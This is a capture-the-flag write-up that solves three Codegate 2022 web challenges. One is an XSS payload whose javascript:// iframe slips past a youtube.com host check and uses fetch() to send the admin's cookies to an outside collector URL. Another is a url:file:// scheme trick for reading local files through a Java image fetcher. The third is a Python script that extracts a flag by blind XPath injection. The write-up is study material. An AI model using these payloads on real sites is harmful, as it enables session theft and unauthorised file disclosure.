
<img src="https://gen.codegate2022.org/files/e41e7b9c97eac5795b630bf3fdbf1df2/codegate2022.png" style="width: 100%; max-width: 100%; height: auto;">

The codegate was held from February 26th to 27th, but I did not even participate because I was not interested, and I only solved 3 web problems today for study.

---
## (Web) CAFE

The CAFE challenge is very similar to the [easyxss](https://dreamhack.io/wargame/challenges/273/) challenge I made in 2021. I heard that there were many solvers at the time of the competition because the administrator account was exposed as unintent.

```php
function filterHtml($content) {
    $result = '';

    $html = new simple_html_dom();
    $html->load($content);
    $allowTag = ['a', 'img', 'p', 'span', 'br', 'hr', 'b', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'code', 'iframe'];

    foreach($allowTag as $tag){
      foreach($html->find($tag) as $element) {
        switch ($tag) {
          case 'a':
            $result .= '<a href="' . str_replace('"', '', $element->href) . '">' . htmlspecialchars($element->innertext) . '</a>';
            break;
          case 'img':
            $result .= '<img src="' . str_replace('"', '', $element->src) . '">' . '</img>';
            break;
          case 'p':
          case 'span':
          case 'b':
          case 'h1':
          case 'h2':
          case 'h3':
          case 'h4':
          case 'h5':
          case 'h6':
          case 'strong':
          case 'em':
          case 'code':
            $result .= '<' . $tag . '>' . htmlspecialchars($element->innertext) . '</' . $tag . '>';
            break;
          case 'iframe':
            $src = $element->src;
            $host = parse_url($src)['host'];
            if (strpos($host, 'youtube.com') !== false){
              $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
            }
            break;
        }
      }
    }
    return $result;
  }
```
If you look at the filterHtml() function, you can see that only a, img, code, and iframe tags can be used. We need to trigger XSS, but only `a` tags and iframe tags. However, the 'a' tag should be clicked by the bot, but there is no click event in the bot, so I just used an iframe.

If you look at the iframe tag part, the hostname of the src attribute value of the iframe should always be youtube.com. That is, it must be a URL such as https://google.com or http://google.com. But we can put hostname in javascript scheme.

All parsers provided by python, java, and javascript separate protocols and hostnames based on ://. But javascript://google.com does not run javascript. However, if it is used like javascript://google.com/%0aalert(1), it is excluded from execution by parsing. We can use this to get flags.

```html
<iframe src=javascript://youtube.com/%0afetch('https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/?flag'.concat(document.cookie))>
```
```txt
codegate2022{4074a143396395e7196bbfd60da0d3a7739139b66543871611c4d5eb397884a9}
```
I inserted the above tag and reported it, so I was able to get an administrator session, and I logged in using the session and read the flag.

---
## (Web) babyFirst

```java
private static String lookupImg(String memo) {
    Pattern pattern = Pattern.compile("(\\[[^\\]]+\\])");
    Matcher matcher = pattern.matcher(memo);
    String img = "";
    if (matcher.find()) {
      img = matcher.group();
    } else {
      return "";
    }
    String tmp = img.substring(1, img.length() - 1);
    tmp = tmp.trim().toLowerCase();
    pattern = Pattern.compile("^[a-z]+:");
    matcher = pattern.matcher(tmp);
    if (!matcher.find() || matcher.group().startsWith("file"))
      return "";
    String urlContent = "";
    try {
      URL url = new URL(tmp);
      BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
      String inputLine = "";
      while ((inputLine = in.readLine()) != null)
        urlContent = urlContent + inputLine + "\n";
      in.close();
    } catch (Exception e) {
      return "";
    }
    Base64.Encoder encoder = Base64.getEncoder();
    try {
      String encodedString = new String(encoder.encode(urlContent.getBytes("utf-8")));
      memo = memo.replace(img, "<img src='data:image/jpeg;charset=utf-8;base64," + encodedString + "'><br/>");
      return memo;
    } catch (Exception e) {
      return "";
    }
  }
```
A vulnerability occurs in the lookupImg() function. If a memo is written in the same syntax as [https://pocas.kr], the lookupImg() function fetches the value inside [] with a regular expression and then verifies the protocol.

```java
    if (!matcher.find() || matcher.group().startsWith("file"))
      return "";
```
When the file scheme is passed, it is returned immediately.

```java
if (spec.regionMatches(true, start, "url:", 0, 4)) {
                start += 4;
            }
// https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/java/net/URL.java#L533L535
```
However, if you look at the URL code, if the start of the url starts with url:, it is parsed by moving the starting point by 4. That is, if the value of url:file:///etc/passwd is passed, it moves by 4 and only file:///etc/passwd is interpreted.

```java
    pattern = Pattern.compile("^[a-z]+:");
    matcher = pattern.matcher(tmp);
    if (!matcher.find() || matcher.group().startsWith("file"))
```
And if you check the file scheme again, you can see that the matcher value is parsed using /^[a-z]+:/ regular expression. Since the parsing is based on the colon, if you just pass it as url:file:///etc/passwd, the character before the first colon is parsed, so the file scheme does not take place. Parse it. As a result, it successfully parses `file:///etc/passwd`.

So just pass it to [url:file///flag] and read the image.

```javascript
atob("Y29kZWdhdGUyMDIyezg5NTNiZjgzNGZkZGUzNGFlNTE5Mzc5NzVjNzhhODk1ODYzZGUxZTF9Cg==")
```
```txt
codegate2022{8953bf834fdde34ae51937975c78a895863de1e1}
```

---
## (Web) MyBlog

```java
XPath xpath = XPathFactory.newInstance().newXPath();
String title = (String)xpath.evaluate("//article[@idx='" + idx + "']/title/text()", document, XPathConstants.STRING);
String content = (String)xpath.evaluate("//article[@idx='" + idx + "']/content/text()", document, XPathConstants.STRING);
```
If you look at the doReadArticle() function, the Xpath Injection vulnerability occurs because the idx value is added as it is.

```docker
RUN echo 'flag=codegate2022{md5(flag)}' >> /usr/local/tomcat/conf/catalina.properties
```
But if you look at the location of the flag, it is in catalina.properties. So I just can't read it. However, while studying Xpath Injection in the past, I used the system-property() function. The function of this function is to return the system property identified by the argument value. So just use this to return the system property called flag and read it with substring().

```python
import requests

url = "http://3.39.79.180/blog/read?idx="
strings = "abcdefghijklmnopqrstuvwxyz0123456789{}"
sess = requests.Session()

def login():
    sess.post('http://3.39.79.180/blog/login', data={'id':'pocas', 'pw':'pocas'})
    print("[+] log-in succeed")

def leak():
    flag = ''
    for i in range(1, 100):
        for c in strings:
            u = url + f"'or substring(system-property('flag'),{i},1)='{c}'or '"
            res = sess.get(u).text
            if 'sdf' in res:
                flag += c
                break
        if len(flag) > 1 and flag[-1] == '}':
            break
    print(f'[+] FLAG : {flag}')

if __name__ == '__main__':
    print('[+] Exploit')
    login()
    leak()
```
```sh
 ⚡ root  ~/hacking/ctf/codegate2022/myblog  python3 exploit.py
[+] Exploit
[+] log-in succeed
[+] FLAG : codegate2022{bcbbc8d6c8f7ea1924ee108f38cc000f}
 ⚡ root  ~/hacking/ctf/codegate2022/myblog 
 ```

---
